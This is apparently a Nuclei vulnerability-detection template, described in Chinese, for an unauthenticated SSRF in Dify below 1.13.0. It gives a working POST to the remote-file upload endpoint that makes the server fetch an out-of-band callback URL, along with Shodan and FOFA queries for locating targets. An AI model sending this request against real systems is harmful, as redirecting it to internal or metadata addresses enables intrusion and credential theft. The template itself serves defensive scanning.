id: dify-ssrf-remote-upload

info:
  name: Dify < 1.13.0 - 通过远程文件上传的未认证 SSRF
  author: 0x_Akoko
  severity: high
  description: |
    该模板用于检测 Dify < 1.13.0 - 通过远程文件上传的未认证 SSRF。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/`、`/console/api/remote-files/upload` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://github.com/langgenius/dify/security/advisories/GHSA-8235-vv5j-mmvg
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-918
  metadata:
    verified: true
    max-request: 2
    vendor: langgenius
    product: dify
    shodan-query: title:"Dify"
    fofa-query: title="Dify" || body="dify"
  tags: dify,ssrf,unauth,ai

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "<title>Dify</title>", "dify")'
        condition: and
        internal: true

  - raw:
      - |
        POST /console/api/remote-files/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"url":"http://{{interactsh-url}}/ssrf-test"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http")'
        condition: and
